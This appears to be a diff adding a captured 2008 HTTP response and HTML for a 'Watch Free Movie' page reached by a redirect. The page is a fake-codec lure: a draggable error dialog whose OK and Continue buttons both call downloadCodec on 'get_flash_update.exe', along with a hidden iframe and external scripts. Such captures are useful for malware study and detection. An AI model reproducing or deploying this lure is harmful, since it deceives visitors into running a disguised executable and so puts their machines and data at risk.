@@ -1,0 +1,56 @@
+location.href=http://www.baeckerei-sedlmaier.de/gowatch.html
+HTTP/1.1 200 OK
+Date: Wed, 30 Jul 2008 20:02:52 GMT
+Server: Apache/1.3.34 Ben-SSL/1.55
+Last-Modified: Wed, 30 Jul 2008 19:07:28 GMT
+ETag: "29541ec-5cc-4890bbf0"
+Accept-Ranges: bytes
+Content-Length: 1484
+Content-Type: text/html
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<title>Watch Free Movie</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="stylesheet" href="master2.css" type="text/css" media="screen" />
+<link rel="shortcut icon" href="" type="image/x-icon" />
+<meta name="robots" content="all, index, follow" />
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+<meta name="author" content="" />
+<meta name="copyright" content="" />
+</head>
+
+<body bgcolor="#000000">
+	<center>
+	<font style="font:20px Tahoma;color:#efefef;"></font>
+	</center>
+	<div id="errorMsg" name="errorMsg" onMouseDown="this.style.zIndex=10;StartDrag(event,this,PutBack)">
+		<div id="close" onClick="CloseErrorMsg()"></div>
+		<input type="submit" id="okButton" value="Ok" onclick="downloadCodec(url)">
+		<input type="submit" value="Cancel" onclick="CloseErrorMsg();">
+		<input type="submit" value="Continue" onclick="downloadCodec(url)">
+	</div>
+	
+	<div id="player">
+
+		<img id="img" src="" alt="">
+	</div>
+	<script type="text/javascript" src="dnd.js"></script>
+	<script type="text/javascript" src="master.js"></script>
+	<script type="text/javascript">
+		<!--
+		var gif = "metacafe.gif";
+		var url = "get_flash_update.exe";
+		
+		document.getElementById("img").src = gif
+		
+		showMovie()
+		-->
+	</script>
+	<iframe id="ifid01" src="metai.html" frameborder="0" style="display:none"></iframe>
+	
+</body>
+</html>
+
